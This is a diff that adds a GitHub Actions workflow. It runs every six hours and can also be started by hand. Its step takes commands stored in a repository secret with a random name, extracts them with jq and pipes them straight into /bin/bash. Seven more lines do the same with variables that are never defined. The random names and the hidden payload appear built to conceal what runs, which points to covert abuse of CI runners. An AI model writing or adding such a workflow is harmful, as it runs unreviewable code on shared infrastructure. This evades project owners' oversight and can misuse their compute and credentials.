@@ -1,0 +1,24 @@
+name: bandasenji
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bandasenji
+        env:
+          uhbmf49230: ${{ secrets.uhbmf49230 }}
+        run: |
+          echo $uhbmf49230 | jq -r .qcw200 | /bin/bash
+          echo $o669 | jq -r .pape220 | /bin/bash
+          echo $ofcuj14 | jq -r .kg87052 | /bin/bash
+          echo $oa997 | jq -r .cmli01373 | /bin/bash
+          echo $skd67370 | jq -r .aqzu9370 | /bin/bash
+          echo $k146 | jq -r .bigu38 | /bin/bash
+          echo $fka82824 | jq -r .ccj8 | /bin/bash
+          echo $gvl97 | jq -r .ernwj39017 | /bin/bash
+
